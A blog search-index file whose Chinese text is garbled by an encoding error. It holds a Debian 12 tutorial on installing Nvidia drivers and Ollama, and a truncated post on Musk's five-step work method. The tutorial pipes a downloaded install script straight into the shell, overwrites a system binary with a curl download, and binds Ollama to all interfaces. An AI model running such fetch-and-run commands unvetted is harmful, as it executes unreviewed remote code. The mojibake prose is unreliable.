<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Debian 12 å®‰è£… Nvidia é©±åŠ¨å’Œ Ollama</title>
    <link href="/cn/Debian_Nvidia_Ollama/"/>
    <url>/cn/Debian_Nvidia_Ollama/</url>
    
    <content type="html"><![CDATA[<p>æ ¹æ®åŒäº‹åé¦ˆï¼Œé«˜ç‰ˆæœ¬çš„ NVIDIA é©±åŠ¨å…¼å®¹æ€§æœ‰é—®é¢˜ï¼Œéœ€è¦å®‰è£… Nvidia é©±åŠ¨ 525.147.05 ï¼Œè¿‡ç¨‹ä¸­å¯èƒ½éœ€è¦å‡çº§å†…æ ¸ã€‚</p><h2 id="å®‰è£…-Nvidia-é©±åŠ¨"><a href="#å®‰è£…-Nvidia-é©±åŠ¨" class="headerlink" title="å®‰è£… Nvidia é©±åŠ¨"></a>å®‰è£… Nvidia é©±åŠ¨</h2><p>æŸ¥çœ‹ Debian ä¸Šæ˜¾å¡å®‰è£…æƒ…å†µã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs prolog">lspci -nn | egrep -i <span class="hljs-string">&quot;3d|display|vga&quot;</span>  <br><span class="hljs-number">01</span>:<span class="hljs-number">00.0</span> <span class="hljs-symbol">VGA</span> compatible controller [<span class="hljs-number">0300</span>]: <span class="hljs-symbol">NVIDIA</span> <span class="hljs-symbol">Corporation</span> <span class="hljs-symbol">AD102</span> [<span class="hljs-symbol">GeForce</span> <span class="hljs-symbol">RTX</span> <span class="hljs-number">4090</span>] [<span class="hljs-number">10</span>de:<span class="hljs-number">2684</span>] (rev a1)<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹é©±åŠ¨å®‰è£…å…·ä½“çš„æƒ…å†µã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">lsmod</span> | grep nouveau  <br><span class="hljs-attribute">nouveau</span> Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-number">2433024</span> Â <span class="hljs-number">0</span>  <br><span class="hljs-attribute">mxm_wmi</span> Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-number">16384</span> Â <span class="hljs-number">1</span> nouveau  <br><span class="hljs-attribute">i2c_algo_bit</span> Â Â Â Â Â Â Â Â Â Â <span class="hljs-number">16384</span> Â <span class="hljs-number">1</span> nouveau  <br><span class="hljs-attribute">drm_display_helper</span> Â Â Â <span class="hljs-number">184320</span> Â <span class="hljs-number">1</span> nouveau  <br><span class="hljs-attribute">drm_ttm_helper</span> Â Â Â Â Â Â Â Â <span class="hljs-number">16384</span> Â <span class="hljs-number">1</span> nouveau  <br><span class="hljs-attribute">ttm</span> Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-number">94208</span> Â <span class="hljs-number">2</span> drm_ttm_helper,nouveau  <br><span class="hljs-attribute">drm_kms_helper</span> Â Â Â Â Â Â Â <span class="hljs-number">204800</span> Â <span class="hljs-number">2</span> drm_display_helper,nouveau  <br><span class="hljs-attribute">drm</span> Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-number">614400</span> Â <span class="hljs-number">5</span> drm_kms_helper,drm_display_helper,drm_ttm_helper,ttm,nouveau  <br><span class="hljs-attribute">video</span> Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-number">65536</span> Â <span class="hljs-number">2</span> asus_wmi,nouveau  <br><span class="hljs-attribute">wmi</span> Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-number">36864</span> Â <span class="hljs-number">5</span> video,asus_wmi,wmi_bmof,mxm_wmi,nouveau  <br><span class="hljs-attribute">button</span> Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-number">24576</span> Â <span class="hljs-number">1</span> nouveau<br></code></pre></td></tr></table></figure><p>çœ‹æ¥å®‰è£…çš„æ˜¯å¼€æºç‰ˆæœ¬çš„é©±åŠ¨ <code>nouveau</code>ï¼Œéœ€è¦å…ˆç¦ç”¨ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;blacklist nouveau&quot;</span> | sudo <span class="hljs-built_in">tee</span> /etc/modprobe.d/nouveau-blacklist.conf<br>sudo update-initramfs -u<br>sudo update-grub<br>sudo reboot<br></code></pre></td></tr></table></figure><p>é‡å¯åï¼Œæ‰§è¡Œ <code>lsmod | grep nouveau</code>  å‘ç°å·²ç»è¿”å›ä¸ºç©ºäº†ï¼ŒæˆåŠŸç¦ç”¨ã€‚</p><p>æ‰§è¡Œå‘½ä»¤<code> sudo apt install nvidia-driver firmware-misc-nonfree</code> å®‰è£… NVIDIA Proprietary Driver æŠ¥é”™ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Consult</span> /var/lib/dkms/nvidia-current/<span class="hljs-number">525</span>.<span class="hljs-number">147</span>.<span class="hljs-number">05</span>/build/make.log for more information.  <br><span class="hljs-attribute">dpkg</span>: error processing package nvidia-kernel-dkms (--configure):  <br><span class="hljs-attribute">installed</span> nvidia-kernel-dkms package post-installation script subprocess returned error exit status <span class="hljs-number">10</span>  <br><span class="hljs-attribute">dpkg</span>: dependency problems prevent configuration of nvidia-driver:  <br><span class="hljs-attribute">nvidia</span>-driver depends <span class="hljs-literal">on</span> nvidia-kernel-dkms (= <span class="hljs-number">525</span>.<span class="hljs-number">147</span>.<span class="hljs-number">05</span>-<span class="hljs-number">4</span>~deb12u1) | nvidia-kernel-<span class="hljs-number">525</span>.<span class="hljs-number">147</span>.<span class="hljs-number">05</span> | nvidia-open-kernel-<span class="hljs-number">525</span>.<span class="hljs-number">147</span>.<span class="hljs-number">05</span> | nvidia-open-kernel-<span class="hljs-number">525</span>.<span class="hljs-number">147</span>.<span class="hljs-number">05</span>; however:  <br>Â <span class="hljs-attribute">Package</span> nvidia-kernel-dkms is not configured yet.  <br>Â <span class="hljs-attribute">Package</span> nvidia-kernel-<span class="hljs-number">525</span>.<span class="hljs-number">147</span>.<span class="hljs-number">05</span> is not installed.  <br>Â <span class="hljs-attribute">Package</span> nvidia-kernel-dkms which provides nvidia-kernel-<span class="hljs-number">525</span>.<span class="hljs-number">147</span>.<span class="hljs-number">05</span> is not configured yet.  <br>Â <span class="hljs-attribute">Package</span> nvidia-open-kernel-<span class="hljs-number">525</span>.<span class="hljs-number">147</span>.<span class="hljs-number">05</span> is not installed.  <br>Â <span class="hljs-attribute">Package</span> nvidia-open-kernel-<span class="hljs-number">525</span>.<span class="hljs-number">147</span>.<span class="hljs-number">05</span> is not installed.  <br>  <br><span class="hljs-attribute">dpkg</span>: error processing package nvidia-driver (--configure):  <br><span class="hljs-attribute">dependency</span> problems - leaving unconfigured  <br><span class="hljs-attribute">Processing</span> triggers for libc-bin (<span class="hljs-number">2</span>.<span class="hljs-number">36</span>-<span class="hljs-number">9</span>+deb12u4) ...  <br><span class="hljs-attribute">Processing</span> triggers for initramfs-tools (<span class="hljs-number">0</span>.<span class="hljs-number">142</span>) ...  <br><span class="hljs-attribute">update</span>-initramfs: Generating /boot/initrd.img-<span class="hljs-number">6</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-<span class="hljs-number">18</span>-amd64  <br><span class="hljs-attribute">Processing</span> triggers for update-glx (<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">2</span>) ...  <br><span class="hljs-attribute">Processing</span> triggers for glx-alternative-nvidia (<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">2</span>) ...  <br><span class="hljs-attribute">update</span>-alternatives: using /usr/lib/nvidia to provide /usr/lib/glx (glx) in auto mode  <br><span class="hljs-attribute">Processing</span> triggers for glx-alternative-mesa (<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">2</span>) ...  <br><span class="hljs-attribute">Processing</span> triggers for libc-bin (<span class="hljs-number">2</span>.<span class="hljs-number">36</span>-<span class="hljs-number">9</span>+deb12u4) ...  <br><span class="hljs-attribute">Processing</span> triggers for initramfs-tools (<span class="hljs-number">0</span>.<span class="hljs-number">142</span>) ...  <br><span class="hljs-attribute">update</span>-initramfs: Generating /boot/initrd.img-<span class="hljs-number">6</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-<span class="hljs-number">18</span>-amd64  <br><span class="hljs-attribute">Errors</span> were encountered while processing:  <br><span class="hljs-attribute">nvidia</span>-kernel-dkms  <br><span class="hljs-attribute">nvidia</span>-driver  <br><span class="hljs-attribute">E</span>: Sub-process /usr/bin/dpkg returned an error code (<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>ç¡®è®¤ debian ç‰ˆæœ¬ <code>lsb_release -a</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-literal">No</span> <span class="hljs-string">LSB</span> <span class="hljs-string">modules</span> <span class="hljs-string">are</span> <span class="hljs-string">available.</span>  <br><span class="hljs-attr">Distributor ID:</span> <span class="hljs-string">Debian</span>  <br><span class="hljs-attr">Description:</span> Â Â Â <span class="hljs-string">Debian</span> <span class="hljs-string">GNU/Linux</span> <span class="hljs-number">12</span> <span class="hljs-string">(bookworm)</span>  <br><span class="hljs-attr">Release:</span> Â Â Â Â Â Â Â <span class="hljs-number">12</span>  <br><span class="hljs-attr">Codename:</span> Â Â Â Â Â Â <span class="hljs-string">bookworm</span><br></code></pre></td></tr></table></figure><p>æ ¹æ® stackexchange ä¸Šçš„å›ç­” ï¼Œå®‰å…¨å‡çº§ Debian å†…æ ¸çš„æ–¹æ³•æ˜¯ä½¿ç”¨ backports å®‰è£…ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb http://deb.debian.org/debian bookworm-backports main&quot;</span> | sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/debian-backports.list<br>sudo apt update<br>sudo apt install -t bookworm-backports linux-image-amd64<br>sudo reboot<br></code></pre></td></tr></table></figure><p>é‡æ–°å¯åŠ¨åï¼Œæ‰§è¡Œ <code>uname -a</code>  å‘ç°å†…æ ¸å·²ç»æˆåŠŸå‡çº§äº†ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span> -a Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â   <br><span class="hljs-attribute">Linux</span> debian <span class="hljs-number">6</span>.<span class="hljs-number">7</span>.<span class="hljs-number">12</span>+bpo-amd64 #<span class="hljs-number">1</span> SMP PREEMPT_DYNAMIC Debian <span class="hljs-number">6</span>.<span class="hljs-number">7</span>.<span class="hljs-number">12</span>-<span class="hljs-number">1</span>~bpo12+<span class="hljs-number">1</span> (<span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">06</span>) x86_64 GNU/Linux<br></code></pre></td></tr></table></figure><p>é‡æ–°å®‰è£… NVIDIA Proprietary Driver <code>sudo apt install nvidia-driver firmware-misc-nonfree</code> ï¼Œè¿™æ¬¡æ²¡æœ‰æŠ¥é”™äº†ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nvidia</span>-smi Â   <br><br><span class="hljs-attribute">NVIDIA</span>-SMI <span class="hljs-number">525</span>.<span class="hljs-number">147</span>.<span class="hljs-number">05</span> Â Â Driver Version: <span class="hljs-number">525</span>.<span class="hljs-number">147</span>.<span class="hljs-number">05</span> Â Â CUDA Version: <span class="hljs-number">12</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>NVIDIA Proprietary Driver 525 æ„Ÿè§‰æœ‰é—®é¢˜ï¼Œè¿‡äº†ä¸€æ®µæ—¶é—´åæœºå™¨å‡ºç°é‡å¯ç°è±¡ï¼Œdmesg æ˜¾ç¤ºé”™è¯¯ <code>ACPI BIOS Error (bug)</code> ã€‚ </p><p>ä¸Šç½‘æœç´¢é”™è¯¯ï¼Œæœ‰äººåé¦ˆæ˜¯ 525 é©±åŠ¨é—®é¢˜ï¼ˆä¸ç¡®å®šï¼‰ã€‚Debain ç³»ç»Ÿ Nvidia é©±åŠ¨æœ‰æ›´æ–°ï¼Œæ‰§è¡Œ <code>apt upgrade</code> åæˆåŠŸå‡çº§åˆ° 535 ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># nvidia-smi</span><br><br><span class="hljs-attribute">NVIDIA</span>-SMI <span class="hljs-number">535</span>.<span class="hljs-number">183</span>.<span class="hljs-number">01</span> Â Â Â Â Â Â Â Â Â Â Â Â Driver Version: <span class="hljs-number">535</span>.<span class="hljs-number">183</span>.<span class="hljs-number">01</span> Â Â CUDA Version: <span class="hljs-number">12</span>.<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>å‡çº§ Nvidia é©±åŠ¨åˆ° 535 åï¼Œæš‚æœªå‡ºç°é‡å¯ç°è±¡ã€‚</p><h2 id="å®‰è£…-ollama"><a href="#å®‰è£…-ollama" class="headerlink" title="å®‰è£… ollama"></a>å®‰è£… ollama</h2><p>æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤å®‰è£… Ollama</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -fsSL https://ollama.com/install.sh | sh<br></code></pre></td></tr></table></figure><p>ä¸‹è½½é€Ÿåº¦å¾ˆæ…¢ï¼Œè¿˜æ˜¯æŒ‚çº¿è·¯ã€‚</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">export</span> https_proxy=http:<span class="hljs-comment">//127.0.0.1:7890</span><br><span class="hljs-keyword">export</span> http_proxy=http:<span class="hljs-comment">//127.0.0.1:7890</span><br>curl -fsSL https:<span class="hljs-comment">//ollama.com/install.sh | sh</span><br></code></pre></td></tr></table></figure><p>æŒ‚ä¸Šçº¿è·¯åï¼Œå¾ˆå¿« Ollama å°±å®‰è£…æˆåŠŸäº†ã€‚</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs clean">&gt;&gt;&gt; Downloading ollama...  <br>######################################################################## <span class="hljs-number">100.0</span>%#=#=-# Â # Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â   <br>&gt;&gt;&gt; Installing ollama to /usr/local/bin...  <br>&gt;&gt;&gt; Creating ollama user...  <br>&gt;&gt;&gt; Adding ollama user to render group...  <br>&gt;&gt;&gt; Adding ollama user to video group...  <br>&gt;&gt;&gt; Adding current user to ollama group...  <br>&gt;&gt;&gt; Creating ollama systemd service...  <br>&gt;&gt;&gt; Enabling and starting ollama service...  <br>Created symlink /etc/systemd/<span class="hljs-keyword">system</span>/default.target.wants/ollama.service â†’ /etc/systemd/<span class="hljs-keyword">system</span>/ollama.service.  <br>&gt;&gt;&gt; NVIDIA GPU installed.<br></code></pre></td></tr></table></figure><p>ollama ä¸‹è½½ llama3 8b å’Œ qwen2 7b æ¨¡å‹ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ollama</span> pull llama3<br><span class="hljs-attribute">ollama</span> pull qwen2:<span class="hljs-number">7</span>b<br></code></pre></td></tr></table></figure><p>æµ‹è¯• llama3 æ¨¡å‹ï¼Œè¿è¡Œæ­£å¸¸ã€‚</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">ollama run llama3  <br>&gt;&gt;&gt; hi  <br>Hi! It<span class="hljs-comment">&#x27;s nice to meet you. Is there something I can help you with or would you like to chat?</span><br></code></pre></td></tr></table></figure><h2 id="å‡çº§-Ollama"><a href="#å‡çº§-Ollama" class="headerlink" title="å‡çº§ Ollama"></a>å‡çº§ Ollama</h2><p>Ollama 0.3.0 æ”¯æŒé€šè¿‡ llama3.1 è¿›è¡Œå·¥å…·è°ƒç”¨ï¼Œæœ‰å¿…è¦å‡çº§ã€‚å‚è§ [4]</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo curl -L https://ollama.com/download/ollama-linux-amd64 -o /usr/bin/ollama<br>sudo <span class="hljs-built_in">chmod</span> +x /usr/bin/ollama<br></code></pre></td></tr></table></figure><p>å‡çº§å®Œæ¯•ï¼Œéœ€è¦é‡å¯ Ollama æœåŠ¡ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo systemctl daemon-reload<br>sudo systemctl restart ollama<br></code></pre></td></tr></table></figure><h2 id="é…ç½®-Ollama"><a href="#é…ç½®-Ollama" class="headerlink" title="é…ç½® Ollama"></a>é…ç½® Ollama</h2><p>å¦‚æœéœ€è¦åœ¨æµè§ˆå™¨æ’ä»¶ï¼ˆæ¯”å¦‚æ²‰æµ¸ç¿»è¯‘ï¼‰ä¸­è°ƒç”¨ Ollama apiï¼Œæ¶‰åŠ Cross-Origin è®¿é—®ï¼Œéœ€è¦ä¿®æ”¹ Ollama é…ç½®ã€‚</p><p>å®˜æ–¹æ–‡æ¡£æåˆ°äº†ç›¸å…³çš„è®¾ç½® [5]ï¼Œç”¨ vim ç›´æ¥ä¿®æ”¹ &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;ollama.service ä¸­ï¼Œæ·»åŠ ä¸‹é¢å†…å®¹ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;OLLAMA_HOST=*&quot;</span><br></code></pre></td></tr></table></figure><p>é‡å¯ Ollama æœåŠ¡</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo systemctl daemon-reload<br>sudo systemctl restart ollama<br></code></pre></td></tr></table></figure><p>åœ¨è¿œç¨‹ä¸»æœºä¸Šï¼ŒæŸ¥çœ‹ Ollama ç«¯å£ä¾¦å¬æƒ…å†µ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">apt install net-tools<br>netstat -antp | grep -i ollama  <br></code></pre></td></tr></table></figure><p>Ollama é»˜è®¤ä¾¦å¬ 127.0.0.1:11434</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcp</span> Â Â Â Â Â Â Â <span class="hljs-number">0</span> Â Â Â Â Â <span class="hljs-number">0</span> <span class="hljs-number">127.0.0.1:11434</span> Â Â Â Â Â Â Â Â <span class="hljs-number">0.0.0.0</span>:* Â Â Â Â Â Â Â Â Â Â Â Â Â Â LISTEN Â Â Â Â Â <span class="hljs-number">50508</span>/ollama<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ SSH å°†è¿œç¨‹ä¸»æœº Ollama ä¾¦å¬çš„ç«¯å£ 11434 è½¬å‘åˆ°æœ¬åœ° 127.0.0.1:11434</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">ssh -N -g -L 127.0.0.1:11434:127.0.0.1:11434 root@1.1.1.1  <span class="hljs-comment"># å°† 1.1.1.1 æ›¿æ¢æˆä½ çš„ ip</span><br></code></pre></td></tr></table></figure><h2 id="OpenAI-Translator-é…ç½®"><a href="#OpenAI-Translator-é…ç½®" class="headerlink" title="OpenAI Translator é…ç½®"></a>OpenAI Translator é…ç½®</h2><p>åœ¨ OpenAI Translator ä¸­å¡«å…¥ä¸‹é¢çš„é…ç½®ï¼Œå³å¯æ­£å¸¸ä½¿ç”¨ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Default service provider :</span> <span class="hljs-string">OpenAI</span><br><span class="hljs-attr">API Key:</span> <span class="hljs-string">ollama</span><br><span class="hljs-attr">API Model:</span> <span class="hljs-string">Custom</span><br><span class="hljs-attr">Custom Model Name:</span> <span class="hljs-string">Your</span> <span class="hljs-string">Model</span> <span class="hljs-string">Name</span><br><span class="hljs-attr">API URL:</span> <span class="hljs-string">http://127.0.0.1:11434</span><br><span class="hljs-attr">API URL Path:</span> <span class="hljs-string">/v1/chat/completions</span><br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p>[0] NvidiaGraphicsDrivers<br><a href="https://wiki.debian.org/NvidiaGraphicsDrivers">https://wiki.debian.org/NvidiaGraphicsDrivers</a></p><p>[1] Debain backports Instructions<br><a href="https://backports.debian.org/Instructions/">https://backports.debian.org/Instructions/</a></p><p>[2] Ollama on Linux<br><a href="https://github.com/ollama/ollama/blob/main/docs/linux.md">https://github.com/ollama/ollama/blob/main/docs/linux.md</a></p><p>[3] Is it possible &amp; safe to use latest kernel with Debian?<br><a href="https://unix.stackexchange.com/questions/725783/is-it-possible-safe-to-use-latest-kernel-with-debian">https://unix.stackexchange.com/questions/725783/is-it-possible-safe-to-use-latest-kernel-with-debian</a></p><p>[4] Ollama v0.3.0 release note<br><a href="https://github.com/ollama/ollama/releases/tag/v0.3.0">https://github.com/ollama/ollama/releases/tag/v0.3.0</a></p><p>[5] Ollama FAQ<br><a href="https://github.com/ollama/ollama/blob/main/docs/faq.md#how-do-i-configure-ollama-server">https://github.com/ollama/ollama/blob/main/docs/faq.md#how-do-i-configure-ollama-server</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>ai</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é©¬æ–¯å…‹çš„å“²å­¦</title>
    <link href="/cn/elon_philosophy/"/>
    <url>/cn/elon_philosophy/</url>
    
    <content type="html"><![CDATA[<h2 id="é©¬æ–¯å…‹çš„äº”æ­¥å·¥ä½œæ³•"><a href="#é©¬æ–¯å…‹çš„äº”æ­¥å·¥ä½œæ³•" class="headerlink" title="é©¬æ–¯å…‹çš„äº”æ­¥å·¥ä½œæ³•"></a>é©¬æ–¯å…‹çš„äº”æ­¥å·¥ä½œæ³•</h2><p>é©¬æ–¯å…‹æç‚¼å‡ºäº†ä¸€ä¸ªäº”æ­¥å·¥ä½œæ³•ï¼Œç§°ä¹‹ä¸ºâ€œç®—æ³•â€ï¼Œè‡ªç§°æ¯å¤©çš„å·¥ä½œå°±æ˜¯ã€Œç®—æ³•å¤è¯»æœºã€ğŸ˜„ï¸</p><p>è¿™äº”ä¸ªæ­¥éª¤æŒ‰é¡ºåºåˆ†åˆ«æ˜¯:</p><p><strong>1ï¼‰è´¨ç–‘æ¯é¡¹éœ€æ±‚ï¼Œè®©è¦æ±‚ä¸é‚£ä¹ˆæ„šè ¢</strong></p><ul><li>æå‡ºä»»ä½•ä¸€é¡¹è¦æ±‚æ—¶ï¼Œéƒ½åº”è¯¥é™„ä¸Šæå‡ºè¿™ä¸€è¦æ±‚çš„äººã€‚</li><li>æ°¸è¿œä¸è¦æ¥å—ä¸€é¡¹æ¥è‡ªæŸä¸ªéƒ¨é—¨çš„è¦æ±‚ï¼Œæ¯”å¦‚æ¥è‡ªâ€œæ³•åŠ¡éƒ¨é—¨â€çš„è¦æ±‚ã€‚</li></ul><p><strong>2ï¼‰åˆ é™¤è¦æ±‚å½“ä¸­æ‰€æœ‰ä½ èƒ½åˆ é™¤çš„éƒ¨åˆ†å’Œæµç¨‹</strong></p><ul><li>è™½ç„¶ä½ å¯èƒ½è¿˜å¾—æŠŠå®ƒä»¬åŠ å›æ¥ï¼Œå¦‚æœæœ€ååŠ æ¥çš„éƒ¨åˆ†è¿˜ä¸åˆ°åˆ é™¤éƒ¨åˆ†çš„10%ï¼Œé‚£å°±è¯´æ˜åˆ å‡å¾—è¿˜ä¸å¤Ÿã€‚</li></ul><p><strong>3ï¼‰ç®€åŒ–å’Œä¼˜åŒ–</strong></p><ul><li>è¿™åº”è¯¥æ”¾åœ¨ç¬¬2æ­¥ä¹‹åï¼Œå› ä¸ºäººä»¬å¸¸çŠ¯çš„é”™è¯¯å°±æ˜¯ç®€åŒ–å’Œä¼˜åŒ–ä¸€ä¸ªåŸæœ¬ä¸åº”è¯¥å­˜åœ¨çš„éƒ¨åˆ†æˆ–è€…æµç¨‹ã€‚</li></ul><p><strong>4ï¼‰åŠ å¿«å‘¨è½¬æ—¶é—´</strong></p><ul><li>æ¯ä¸ªæµç¨‹éƒ½å¯ä»¥åŠ å¿«ï¼Œä½†åªæœ‰éµå¾ªäº†å‰ä¸‰ä¸ªæ­¥éª¤ä¹‹åæ‰èƒ½è¿™ä¹ˆåšã€‚</li></ul><p><strong>5ï¼‰è‡ªåŠ¨åŒ–</strong></p><ul><li>è¿‡æ—©çš„è‡ªåŠ¨åŒ–ä¼šäº§ç”Ÿé—®é¢˜ï¼Œè‡ªåŠ¨åŒ–æ˜¯æœ€åä¸€ä¸ªæ­¥éª¤ï¼Œåœ¨æ­¤ä¹‹å‰å¿…é¡»ç»è¿‡è´¨ç–‘ã€åˆ é™¤ã€ç®€åŒ–ç­‰æ­¥éª¤</li></ul><h2 id="é©¬æ–¯å…‹äº”æ­¥å·¥ä½œæ³•çš„é‡è¦æ¨è®º"><a href="#é©¬æ–¯å…‹äº”æ­¥å·¥ä½œæ³•çš„é‡è¦æ¨è®º" class="headerlink" title="é©¬æ–¯å…‹äº”æ­¥å·¥ä½œæ³•çš„é‡è¦æ¨è®º"></a>é©¬æ–¯å…‹äº”æ­¥å·¥ä½œæ³•çš„é‡è¦æ¨è®º</h2><ul><li>æ‰€æœ‰æŠ€æœ¯ç»ç†éƒ½å¿…é¡»æœ‰å®æˆ˜ç»éªŒï¼Œè½¯ä»¶å›¢é˜Ÿçš„ç®¡ç†äººå‘˜è‡³å°‘èŠ± 20% çš„æ—¶é—´ç¼–ç¨‹</li><li>çŠ¯é”™æ²¡å…³ç³»ï¼Œä½†é”™äº†è¿˜ä¸è‚¯ä½å¤´å°±ä¸è¡Œ</li><li>å”¯ä¸€è¦éµå®ˆçš„è§„åˆ™å°±æ˜¯ç‰©ç†å­¦å®šå¾‹èƒ½æ¨å¯¼å‡ºæ¥çš„è§„åˆ™ï¼Œå…¶ä»–ä¸€åˆ‡éƒ½åªæ˜¯å»ºè®®</li><li>æ·±åº¦è°ƒç ”éœ€è¦è·¨çº§æ²Ÿé€šï¼Œç›´æ¥å’Œä½ 